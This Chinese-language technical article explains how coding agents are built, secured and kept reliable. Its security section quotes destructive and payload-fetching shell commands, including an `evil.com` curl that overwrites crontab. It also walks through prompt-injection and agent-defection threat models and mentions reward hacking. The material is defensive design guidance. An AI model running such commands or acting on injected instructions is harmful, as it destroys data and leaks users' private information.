# Coding Agent 与代码生成

<p class="note-date">更新于 2026-11-03</p>

**一句话定义**：Coding Agent 是能自主编写、修改和执行代码的 Agent；对开放任务型通用 Agent 而言，它加文件系统就是架构核心，而代码生成本身是一种"能创造其他能力"的元能力。

以开放任务为目标的通用 Agent，其核心是一个 Coding Agent 加上文件系统——Agent 存放代码、数据、记忆和中间结果的工作空间。这一判断来自工业界实践的反复验证：从 Manus 到 OpenClaw，成功的开放任务型通用 Agent 都遵循同一范式——用少量通用工具（代码执行、文件读写、搜索）构建 Coding Agent 运行时，再在其上叠加浏览器自动化、网络搜索等能力模块。

为什么代码生成能担此重任？因为它不只是工具箱里的一件工具，而是元能力（meta-capability）：Agent 用它当场写出新工具、新约束、新表达形式，在运行时动态扩展能力边界。思考上，形式化代码让推理无歧义（"年龄大于 18 且已实名认证"写成 `age > 18 and is_verified` 毫无歧义）；表达上，能跑通的代码本身就是逻辑自洽的证明，执行结果提供客观的对错标准——这是自然语言做不到的。

## 核心原理

### Coding 是 Agent 的基础能力

一个基础 Coding Agent 只需七个核心工具，即可覆盖几乎所有编码动作（五类操作：浏览/读取/修改/执行/搜索；第七个 Code Interpreter 对应"执行代码/计算"，有的实现里与 Bash 合并）：

1. **Code Interpreter**：隔离沙盒中安全执行 Python 代码
2. **Bash Shell**：终端执行命令（跑测试、处理特殊格式文件）
3. **读文件** / 4. **写文件** / 5. **编辑文件**（局部修改，代码迭代的核心操作）
6. **Glob**：按文件名模式定位文件（如 `**/*.py`）
7. **Grep**：按内容模式搜索（如搜某函数的所有调用行）

注意：这套工具集是 Coding Agent 特有的基础配置，不同于按调用方向划分的五类通用工具分类（感知/执行/协作/事件触发/用户沟通）——协作类需求在 Coding Agent 中通常由 Agent 框架的编排逻辑处理，而非专用工具。这些工具均可通过 MCP 协议暴露为标准化服务。

### 通用 Agent 的 Coding 内核：从 Manus 到 OpenClaw

Manus 将 Deep Research、Computer Use、Coding 三大能力融合于一个系统；开源项目 OpenClaw 采用类似思路。为什么核心是 Coding 而非另两者？因为几乎所有高效的内容生成最终都落到代码上：PPT 本质是 OOXML 格式的代码，报告可由代码生成，数据分析靠 Python 脚本，成功的浏览器操作序列可固化为可复用的 RPA 代码；而 Computer Use 虽通用性更强，成本、延迟和稳定性都不如直接用代码或 API。代码生成是效率最高、成本最低、可复用性最强的能力基座。

**文件系统是 Agent 的中枢**，不只是存储：长期记忆存于 `MEMORY.md`（高层级事实、用户偏好）和按日归档的 Markdown 日志；`SOUL.md` 定义 Agent 身份与行为规则；知识库文件沉淀任务经验；Git 提供版本控制与回滚。选 Markdown 而非向量数据库看似反直觉，实则有效：用户可直接打开阅读修改（记错了删那一行即可）、天然保留时间顺序、可 Git 回滚。Agent 拥有写文件能力，意味着它可以通过写文件自我进化——首次执行任务发现的关键信息写入知识库，下次自动加载（外部化学习范式的实践）。

**适用边界**：以 Coding 为核心架构的判断适用于开放任务型 Agent（深度调研、内容生成、数据处理——任务边界不确定、无法预枚举工具）；垂直领域 Agent（客服、语音助手）任务空间封闭，围绕固定业务流程构建，代码只是工具箱中的一件工具。但无论哪类，具备 coding 能力都是所有 Agent 的共同底线。

### Sessionless 设计

OpenClaw 采用无会话（Sessionless）设计：无安装、登录、"打开 App"，Agent 常驻在线，用户在已有消息平台发一条消息即得响应。这一形态成立的前提是：大模型已成熟到可充当"新操作系统"——像 OS 屏蔽硬件那样屏蔽语言理解与规划的复杂性，提供统一智能抽象。

工程难点是状态如何跨消息存活（两条消息可能间隔几分钟或几天）。OpenClaw 分两层管理：

- **文件系统状态**：天然持久——工作区挂载在沙盒外的持久存储上，代码、数据、中间产物跨消息、跨重启不丢。
- **进程状态**：按需保活或重建——沙盒与终端会话活跃期保持运行（避免每条消息冷启动），闲置超时销毁回收资源，销毁前把可序列化的环境状态（工作目录、环境变量、后台任务清单）写入工作区文件，下次唤醒按记录重建。

Sessionless 并非免维护：每条消息都需重新加载完整轨迹和工作状态，对状态序列化效率和轨迹压缩策略要求更高。

## Coding Agent 的安全

### 威胁模型：致命三要素 + 持久记忆

Simon Willison 概括的"致命三要素"——三要素齐备即构成完整攻击闭环，系统属高危：

1. **访问私有数据**（能读用户文件、密码管理器）
2. **暴露于不受信任内容**（邮件、网页可能含恶意载荷）
3. **具备外部通信能力**（能发邮件、执行命令）

攻击路径闭合：恶意指令藏于不受信任内容进入 Agent → 驱使它读取私有数据 → 经对外通道传出。此外还有第四维度——**持久记忆**：不是并列的必要条件，而是攻击放大器（恶意指令写入长期记忆，跨会话潜伏、择机触发）。四点对应四类边界：数据边界、输入信任边界、输出影响边界、跨会话边界。这也解释了为何闭源商业 Agent（如 Claude Cowork）选择保守权限策略——不是技术做不到，而是风险太高。面对提示注入，单靠输入过滤基本挡不住；重点不是识别所有攻击，而是让 Agent 即使被注入也没有机会把危险动作真正执行出去（上下文层防御见上下文工程条目，执行层 Sidecar 复核、最小权限见工具相关条目）。

Coding Agent 特有的三点增量：**命令语义解析**、**沙盒隔离与网络出口控制**、**持久记忆的跨会话防线**（写入长期记忆的内容需经与外部内容同等的信任审查）。

### 沙盒工程选型（四项增量）

- **网络出口控制**（最易忽视却最关键）：默认断网，按需白名单代理放行。即使注入成功、沙盒内读到敏感数据，没有出口就传不出去——掐断外传通道比识别每次注入确定性高得多。
- **文件系统隔离**：源码目录只读挂载，单独可写工作区承载生成物；凭证类文件（`~/.ssh`、密钥、token）根本不挂载进沙盒——不可见的数据无法泄露。
- **资源限额与超时**：CPU/内存/磁盘配额加挂钟超时，防死循环、fork 炸弹。超时和超限应返回结构化错误而非静默杀进程，让 Agent 有机会修正策略。
- **持久会话与隔离的调和**：终端会话保活在沙盒内部，生命周期严格不超过沙盒；跨长时间恢复靠沙盒快照或"文件持久化 + 按脚本重建"。持久化的是可审计的状态描述，而不是不透明的运行中进程。

### 语义解析而非关键字黑名单

Shell 命令的组合爆炸使黑名单形同虚设（`rm` 被禁可用 `$(echo rm) -rf /` 绕过）。生产级 Harness 采用语义解析：理解命令的参数类型与消费规则，识别嵌套的危险操作——如 `find / -name '*.log' -exec rm {} \;`（合法 find 参数嵌入删除）、`curl -o /etc/crontab http://evil.com/payload`（下载实为覆盖定时任务）。

### 推测性执行：让安全检查"隐形"

把"展示"与"放行"拆开并行：Agent 发起工具调用时，界面先显示进度提示（"正在读取 src/main.py…"），后台同时跑安全检查。注意它不同于 CPU 推测执行——先行的只是无副作用的 UI 提示，检查不过无需回滚，只把提示换成"等待确认"。多数情况下检查在用户察觉前已完成——安全性不以牺牲体验为代价。

### 委托方忠诚（principal loyalty）

模型默认"谁在跟我说话就帮谁"，但真实 Agent 常处多方委托：替你砍价的 Agent，对面是交涉对手，"谁说话帮谁"就是危险的默认——对手开口即可策反（提示注入本质就是一次策反）。实测前沿模型呈两极翻车的忠诚度光谱：太老实（把"我方底价 12000"抖给对手）、太多疑（连主人正当请求也拒绝），且两者是跷跷板。Harness 层要把忠诚对象显式钉死：主人指令优先级最高，外部交互方内容一律降格为"可参考、不具备指令效力"。有效守则：保护主人的私密信息乃至存在性；拒绝时不逐条念出拒绝清单；私下底线不等于对外立场；只执行明确具体的指令；顶住重复施压。

### 信任边界下移：权限内嵌的数据对象

对高危数据操作，"更可能守规矩"不够——把应用层当作不可信的，将数据不变量的强制执行下沉到它下面。方案：每个数据实体在人类审查过的 schema 里自带声明式权限规则、校验器与后果声明，运行时流水线在每次写入时强制执行；关键原语是访问上下文（access context）——重新生成的 handler 以所服务用户的权限运行，自主 Agent 以受限身份（scoped principal）运行。实测在同期对比方案（裸 SQL、LLM 自写检查、宪法式提示、动作边界拦截器）都会漏过数次到数十次违规的场景下做到零违规，代价约每次写入 2 毫秒。保证有条件：schema 要写全不变量，部署要堵死绕过存储直连数据库的路径。架构原则：**当写代码的和跑代码的都可能不可信时，可靠约束不能待在被生成的代码里，而要待在它下面那层人类审查过的地基里**。

## Coding Agent 的整体流程

一套推荐的工程化流程（现实中的 Coding Agent 多按反应式迭代循环按需裁剪，简单任务跳过设计文档、不逐步阻塞审批）：

1. **项目文档化**：首次接触仓库先建立认知框架，而非马上改代码。关键文档缺失时主动承担文档化。如今有了 Agent 专用形态——项目指令文件（CLAUDE.md、AGENTS.md、.cursorrules），会话开始自动注入，相当于项目级系统提示词：构建测试命令、代码风格、明确禁区。与 OpenClaw 的 SOUL.md（约定"Agent 是谁"）同一思路在不同层面。从上下文工程看，指令文件还是最经济的稳定前缀（KV Cache 友好）。推论：对远程工作友好的团队往往也对 Agent 友好——"AI-ready"程度的代理指标：远程新人只靠仓库和文档能否独立开展工作。
2. **需求理解与澄清**：简单需求直接实现；复杂需求（模糊性、路径多样性、影响面广）先探索性调研，必要时与用户对话。需求模糊就编码往往大量返工。
3. **设计文档**：回答改哪些模块及原因、什么方案及优势、引入哪些依赖、预期影响。写设计文档本身是深度思考，也为人类提供高效介入点——审查文档远比审查数百行代码容易。提交审批后再继续。
4. **编码与测试**：遵循项目规范、复用现有抽象；测试驱动质量保障——测试失败应分析、修复、重跑而非报告了事。Coding Agent 最常见的偷懒是写完不跑测试就报"完成"；应把"测试通过"而非"代码写完"定义为完成标准。
5. **审查与交付**：自我批判性审视（可读性、性能、安全、风格），可借助 lint 工具或代码审查子 Agent；架构级变化需同步更新文档——过时的文档比没有文档更糟。

核心原则：**计划先于行动，验证贯穿始终，文档与代码共同演化**。

## Harness 工程在 Coding Agent 中的实践

Coding Agent 是 Harness 工程收益最大的领域——代码是所有 Agent 任务中可验证性最高的一类。Harness 落地为四个组件：**验收基线**（测试套件、CI、审查标准）、**执行边界**（模块边界、依赖规则、权限）、**反馈信号**（Linter、测试结果、类型检查）、**回退手段**（Git、沙盒、快照回滚）。

按"任务清晰度 × 验证自动化"分四象限：目标明确 + 可自动验证是最佳区域；目标清楚但靠人审则吞吐受限于人的审查速度；有自动化反馈但目标模糊会"高效地跑偏"；两者都缺则 Agent 派不上用场。代码编写天然处于最佳象限核心——**Coding Agent 成熟度最高，不是因为代码生成模型特别强，而是因为软件工程几十年积累的基础设施（测试、Linter、类型系统、Git）天然构成了一套强大的 Harness**。

业界案例：大规模代码迁移的关键在 Harness 三件事（知识必须存在于代码库本身、约束编码进 Linter 和 CI 而非文档、验证与纠正全链路自动化）；LangChain 仅靠优化 Harness（系统提示词、工具中间件、自验证循环）就显著提升基准表现，且"用 Agent 分析失败轨迹改进 Harness"使工程从经验驱动转向数据驱动；Anthropic 把长任务拆为初始化 Agent（分解任务清单）+ 执行 Agent（逐项推进、留中间成果给下一轮），解决"一次想做太多"和"过早声称完成"。

可迁移的四条设计原则：

1. **约束优先于指导**：能代码强制的规则就不用文档建议——Linter 规则是"做不了"，提示词只是"建议别做"。
2. **验证要自动化**：人工审查是不可扩展的瓶颈。
3. **反馈越快越好、越结构化越好**：错误信息越详细、越接近发生时刻，纠正效率越高。
4. **回退要可靠**：Agent 在安全网内才能大胆试错。

约束的另一层目的是防**过程性错误**：结果正确但手段破坏性（修数据库直接删库重建）也不行。破坏性捷径总存在，即使写进评估指标 Agent 也常能绕过（reward hacking 的日常形态），因此生产级 Harness 要对 `rm -rf`、删生产数据、覆盖未读文件设专门检查与审批——约束动作而非仅结果；训练侧的对应物是"奖励结果、惩罚路径"的过程惩罚。工具编排上，**故障只在同一批并行调用内传播，不上升到父级操作**：读三个文件一个失败，只报告那一个，不取消另外两个、更不中止整个任务。

### 故障与错误恢复

**四层故障分类**：API 层（限流 429、过载、超时、输出截断——基础设施噪声）；工具层（幻觉调用、参数畸形、执行异常，最危险的是反复返回同一错误而模型不加改变地重试）；上下文层（窗口溢出、压缩失败、轨迹结构损坏）；控制流层（死循环、死亡螺旋——错误触发的恢复逻辑自身又调 LLM 再出错、连锁反应）。

**检测——先分类再计数**：第一个判断不是"要不要重试"而是"值不值得重试"——可重试（限流、抖动）与不可重试（参数不合法、权限不足）必须区分，后者原样重试无意义。模式检测：对"工具名+参数"算指纹，相同指纹反复出现即无进展循环信号；每条恢复路径维护独立失败计数。流式连接最危险的不是断开而是**静默卡死**，需独立空闲看门狗——可推广为"每个长连接都需要活性信号"。完整性监控针对轨迹结构（工具调用缺配对结果时自动修复）。注意"产品模式宽容、训练模式严格"的双重标准：产品模式可用占位符修补缺失消息，训练模式拒绝修复（合成占位符会污染训练数据）。

**恢复——分级升级、逐级透明**：① 静默重试（指数退避 + 随机抖动 + 尊重服务端等待提示；区分前台/后台调用，辅助性后台调用失败直接放弃，防"重试放大"）；② 降级与接续（输出触顶先提上限重发、再追加元指令从断点接续；主模型过载降级备用模型，需先剥离旧模型私有格式块）；③ 暴露给用户（附已尝试的恢复动作）。工具层错误走另一条路：不终止会话，把结构化错误变成模型输入，由模型下一轮自行纠正。核心原则：错误处理的边界是整个恢复循环——恢复期间扣留错误消息，确认无法恢复才释放（"在确认无法恢复之前，不暴露中间态"）。

**终止——每条恢复路径都要有上限**：熔断阈值来自产线数据而非拍脑袋（如"连续 3 次压缩失败即放弃"来自真实会话统计——曾有会话在这条路径连续失败三千余次，此类无效重试每天浪费约 25 万次 API 调用）。死亡螺旋防护两条：错误路径上禁用一切会再次调用模型的副作用逻辑；用递归深度计数器打断残余连锁。最上层是全局终止与升级：最大迭代轮数、会话预算上限、连续失败超阈值升级人工。**Agent 的可靠性不取决于它犯不犯错，而取决于每类错误是否都有对应的检测、恢复与终止路径。**

## 实现技巧

- **并行工具调用、流式执行与级联中止**：第一个工具调用参数一经生成完整并通过校验即开始执行，与后续调用的生成重叠；独立调用并行执行。每个工具声明是否支持并发（默认否，失败安全）；失败时级联中止同批依赖该结果的调用，不波及独立调用和父级操作。
- **上下文精细化管理**：大文件按行号范围读取而非全量加载；返回内容附行号前缀——模型可精确引用"src/main.py 第 42 行"，编辑更可靠。终端输出保留头尾若干行、中间以提示替代，完整输出存临时文件按需查看。
- **环境信息动态注入**：每次推理前以 Agent 状态栏注入当前工作目录、git 分支、最近提交、变更概览。不硬编码进静态系统提示词（破坏 KV Cache），而是动态追加式注入。
- **命令执行环境状态持久化**：维护一个持久化终端会话（保留工作目录、环境变量、会话状态），默认模式；保留启动隔离终端的能力以支持并行任务。
- **即时语法反馈**：文件写入一完成，工具层自动跑 linter/语法检查，结果并入工具返回值——错误在引入的那一刻就修正，而非等到跑测试。

## 搜索工具与文件编辑

### 四种互补的搜索工具

| 工具 | 原理 | 优势 | 局限 |
|---|---|---|---|
| grep/ripgrep 正则内容匹配 | 逐行扫描匹配模式 | 已知具体文本时快速准确，正则可捕捉复杂结构 | 只能匹配文本，不懂语义 |
| glob 文件名模式 | 只查路径不读内容 | 速度极快，探索项目结构第一步 | 无内容信息 |
| 语义代码搜索 | 向量嵌入 + BM25 混合检索 + 重排序 | 找语义相似但用词不同的代码 | 需建索引、需结构感知分块 |
| LSP 符号定义/引用 | 语言服务器协议 | 区分定义与调用、消除同名歧义，重构必备 | 需 IDE 基础设施 |

语义搜索需解决结构感知分块（按函数/类完整语义单元切分）和混合检索（稠密嵌入找语义、BM25 精确匹配标识符）。是否建嵌入索引存在路线之争：Claude Code 等终端型 Agent 刻意不建索引，纯靠 grep+glob 现场检索（免维护陈旧索引、省基础设施、避免代码外发）；Cursor 等 IDE 型工具愿为跨文件语义召回付建索引成本。取舍本质是"基础设施与数据外发代价"对"语义召回收益"。实践中组合使用：语义找模块 → 正则定位行 → 符号追调用链，"从粗到细、从语义到语法"。

### 五种文件编辑方案

| 方案 | 思路 | 优劣 | 采用 |
|---|---|---|---|
| Diff + Apply Model | 主模型输出变更描述/带省略骨架，专用小模型合并 | 分离关注点；合并环节脆弱 | Cursor（fast-apply + 推测解码，每秒上千 token） |
| Old String → New String | 精确字符串查找替换 | 可预测透明；大段删除需全量输出、一字之差即失败 | Claude Code |
| 行号定位 | 删第 X-Y 行、插入新内容 | 精确高效；模型数行号易错、行号随编辑漂移 | IDE 深度集成场景 |
| 类 Vim 命令 | 复制/剪切/粘贴等丰富语义 | 重组高效；弱模型错误率明显上升 | 实验性 |
| 字符串首尾匹配 | 只给开头结尾几行定位替换区 | 大段删除免全输出；需首尾组合唯一 | 部分定制方案 |

实践建议：自建 Agent 以 Old→New 为最稳妥起点；大段改动用首尾匹配；行号方案仅在 IDE 实时维护行号映射时可靠。

## 代码：通用 Agent 的元能力

元能力是"能创造其他能力"的能力：代码精确、可执行、可组合，因此既能产出新工具，也能产出新约束和新表达形式。六个方向按作用对象**由内而外、最终回到自身**组织。

### 1. 思考工具

模型思考本质是概率性、近似的，而数学逻辑要求确定性精确答案。Wolfram 洞察：符号计算系统（保持 √2 精确形式）擅长精确计算但自然语言理解脆弱、覆盖窄；LLM 恰好相反。协同模式：LLM 负责理解问题并形式化为 SymPy/Mathematica 语言或约束定义，交给符号计算引擎/约束求解器执行。两组实验验证：数学解题（AIME 风格题，sympy/scipy/numpy 沙盒）与逻辑谜题（K&K Puzzle，python-constraint 约束求解）代码辅助均显著高于纯思维链。

重要规律：**模型与脚手架（harness）此消彼长**——模型够强时脚手架可以更薄（代码求解器增益收窄），不够强时就得让代码兜住正确性。同一套脚手架配不同能力的模型，结论可能截然不同——这是评估 Agent 技术时易被忽视的前提。

### 2. 业务规则的约束

自然语言规则充满歧义（"7 天"是自然日还是工作日？），代码要么成功要么报错，无歧义。提示词内规则与代码化校验互补：前者支持解释与变通，后者提供确定性。代码化的真正价值不在省 token，而在**防止不可逆操作**（取消订单、转出资金、删数据）。

以 τ-bench 航空取消政策为例的"三重保障"设计：

- **参数作为思考的 checklist**：工具描述列出完整政策，可选 `expected_*` 参数迫使模型先查订单、逐条核对再调用——模型常在准备参数时就发现违规，根本不发起调用。此层只引导思考，不承担安全责任。
- **服务端真值校验才是守门员**：舱位、保险状态、预订时间、航段使用、当前时间全部来自数据库和服务端时钟，**没有任何政策事实采信模型自报值**——模型可能幻觉也可能被注入操纵；`expected_*` 与真值不一致时记录告警。关键操作需要独立验证——独立性不仅指独立的模型，更指**独立的数据来源**。
- 系统提示词自然语言规则帮助理解和解释。

三重保障：前两重减少错误发生，第三重确保错误不会变成不可逆损失。实验显示小模型（Qwen3-4B 级）在此设计下复杂政策执行准确性和一致性显著提升。

### 3. 代码驱动的多媒体生成

复杂文档创作本质是结构化数据的组织呈现。PPT 重构为代码问题：用 Slidev 这类 Markdown/HTML 框架，Agent 避开 GUI 视觉定位难题。但生成代码不等于知道渲染效果，需要**提议者-审核者（Proposer-Reviewer）机制**：Proposer 生成 Slidev 代码；Reviewer 渲染每页截图，用 Vision LLM 按"内容密度/可读性/布局/美感"产出结构化改进建议（含页码、问题类型、严重程度），迭代 2-3 轮。双 Agent 分工而非单 Agent 循环的核心优势是上下文管理：Reviewer 只看最新渲染图，Proposer 只累积结构化文本反馈；单 Agent 会在同一上下文累积数十页图片的多轮迭代而迅速超限。终止条件两类：质量达标（审核者判定）+ 最大轮数（预算上限防失控）。

视频编辑同理：剪辑软件 GUI 过于复杂，改用 Blender Python API / FFmpeg 程序化接口，自然语言转 API 调用远比模拟鼠标点击容易。场景定位用两步策略（子 Agent 每 10 秒截图粗定位 → 更窄范围每秒截图精定位），封装为子 Agent 避免大量截图挤占主上下文。配套实验：论文转 PPT、论文讲解视频（PPT 截图 + 口语化讲解稿 + TTS + ffmpeg 音画同步合成）、自然语言视频剪辑。

### 4. 系统适配器

代码是连接任意系统的"万能胶"：外部服务无 SDK、文档缺失、格式非标、字段漂移时，Agent 当场读文档或观察真实响应，即时生成适配代码（构造 HTTP 客户端、拼鉴权头、解析非标返回、翻译数据模型）。延伸到无 API 的系统：先 Computer Use 操作界面，再把成功操作序列固化为 RPA 代码——未来直接跑代码，高速高稳免视觉思考。

- **自适应日志解析**：前端解析失败不报错，而是把日志样本和报错报告给 Agent → 生成解析代码 → 虚拟浏览器自动测试（Vision LLM 查可视化效果）→ 热更新部署。系统自动跟随数据格式演化。
- **生产日志智能诊断**：Agent 读轨迹日志 + 架构文档 + PRD，判断执行流程是否符合预期、定位偏差环节，生成结构化问题报告和回归测试用例（引用轨迹 ID 和交互轮次，测试框架自动重放验证），再通过 MCP 对接 GitHub 自动创建 Issue 并分派——人工诊断从小时级降到分钟级。

### 5. 生成式 UI

纯文本对话在收集结构化信息（十轮问答）、呈现复杂数据（表达力有限）、选项选择上效率低下。Agent 可动态生成表单、图表乃至完整 Web 应用。

- **A2UI 类声明式协议**：Agent 直接生成 HTML/JS 有安全风险——提示注入可诱导生成窃取数据的脚本（成因是提示注入，浏览器端效果类似 XSS，不能混为一谈）。A2UI 让 Agent 只输出 JSON 界面描述清单，客户端用受信任的预定义组件目录（Card、Button、TextField、Table）渲染——像餐厅点菜，只能点菜单上有的，不能进厨房自己做。注意区分：AG-UI（CopilotKit 提出）不是界面描述语言，而是推送执行状态的事件/传输协议，与 A2UI 互补而非同类。声明式适合标准化交互；高度定制化需求仍需直接生成代码。
- **HTML 交付件取代 Markdown 汇报**：交互式演示、更好的数据可视化、可持续完善的活文档。示例实践：研究项目维护持续更新的交互式网站，承担实验数据追溯、训练"内科指标"监控（损失曲线、梯度范数、KL 散度等反映训练过程本身健康的内部信号，早于结果指标暴露问题）、运行原理展示三类作用。
- **澄清用户意图**：动态表单（含级联逻辑）一次收集全部信息，取代十轮文本问答。
- **SQL 查询 Artifact 模式**：不让 LLM 读数据再复述（耗 token、易抄错），而是生成 SQL 代码作为 artifact 交系统执行，数据从数据库直达前端渲染，完全绕过 LLM 这个"中间人"；还可生成 SQL + 可视化两个 artifact 形成流水线——LLM 只生成代码，不参与数据传递。
- **动态生成软件**：Anthropic "Imagine with Claude" 展示从零实时生成应用的边界；更务实的是基于已有框架的半定制（用户说"把按钮改成蓝色"，Agent 改前端代码，热加载 HMR 即时生效），"一刀切"变"千人千面"。

### 6. Agent 自举（bootstrapping）

用代码修复、复制、创造与自己同类的 Agent（作用对象是 Agent 的代码与结构；区别于不改权重、沉淀经验与策略的"自我进化"）。类比：DNA 自复制是盲目试错、不能定向修改；Agent 自举是理解自身机制、定向设计、继承最佳实践。

- **自我修复（OpenClaw doctor）**：自动检测配置异常（过期 token、端口冲突）、状态问题（陈旧锁文件）、服务健康问题。分层修复：确定性检查先覆盖高频问题（与传统运维脚本无本质不同），确定性规则未覆盖的疑难交给 LLM 分析日志、推断因果、生成修复方案。有风险的修复需用户确认。
- **让 Agent 编写 Agent 的关键技巧**：常见缺陷有四——上下文管理随意（未用标准消息格式、丢 KV Cache 优化）、工具设计不规范（描述简略、无负面清单）、技术选型滞后（用训练数据里最常见的过时 API）、外部生态脱节。最有效的解法不是在提示词里穷尽规则，而是**提供高质量 Agent 实现作为参考范例，在范例上修改而非从零写**——范例代码本身就是最佳实践的载体，架构上的好选择自然保留。接到任务时：复制自己的（或经验证的）代码 → 调整系统提示词匹配新角色 → 替换/增删工具 → 修改业务逻辑但保留架构框架——"自我复制并适应性修改"，如基因复制加变异。

## 经验与常见坑

- Coding Agent 最常见的偷懒：写完代码不跑测试就报告"任务完成"——完成标准必须是"测试通过"。
- 安全检查靠关键字黑名单挡不住 Shell 组合爆炸；靠输入过滤挡不住提示注入——重点是让危险动作执行不出去。
- 过时的文档比没有文档更糟；Agent 看不到的知识等于不存在——知识必须存在于代码库本身。
- 恢复机制自身也会失效：每条恢复路径必须有熔断上限，错误路径上禁用会再次调用模型的副作用逻辑（防死亡螺旋）。
- 让 LLM 读大表数据再"抄写"给用户：耗 token、慢、极易出错——用 artifact 模式让数据绕过 LLM 直达前端。
- 行号编辑方案在非 IDE 场景因行号漂移而不可靠。

## ⚠️ 时效性说明

- OpenClaw、Claude Cowork、Manus、"Imagine with Claude" 等产品与架构细节随版本快速演进，文中引用为写作时点的形态。
- 文中引用的两篇文献（多方委托忠诚度、权限内嵌数据对象）标注为 2026 年 arXiv/待发表，结论以正式发表版为准。
- 工具编辑方案、模型能力对比（如"弱模型 + 代码辅助"的增益）随模型迭代会变化——模型与脚手架此消彼长，结论有明确的时间边界。
- 具体熔断阈值（如"连续 3 次"）来自特定产品（Claude Code）的产线统计，迁移时应以自己的产线数据重新标定。
